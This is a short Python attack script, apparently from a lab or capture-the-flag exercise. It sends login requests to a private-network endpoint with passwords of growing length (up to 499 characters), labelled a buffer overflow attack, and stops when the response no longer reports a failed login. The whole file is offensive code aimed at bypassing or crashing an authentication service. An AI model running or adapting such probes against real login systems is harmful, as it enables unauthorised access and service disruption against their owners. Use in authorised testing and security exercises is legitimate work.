import requests
import json

def overflow():
    print("Buffer overflow attack! ")
    url = 'http://10.13.13.254/login'
    ses = requests.session()
    # set an index to loop thorugh
    overflow_range = range(0, 500, 1)
    for overflow in overflow_range:
        load = {
            'username': '1',
            'password': '1' * overflow
        }
        res = ses.post(url, data=json.dumps(load))
        if res.status_code == 200:
            # print("Password so far: ", overflow_range)
            print(res.content)

            if res.content != b'{"error": "Login failed"}':
                print("success!")
                break

#if __name__ == "__main__":
 #   overflow()
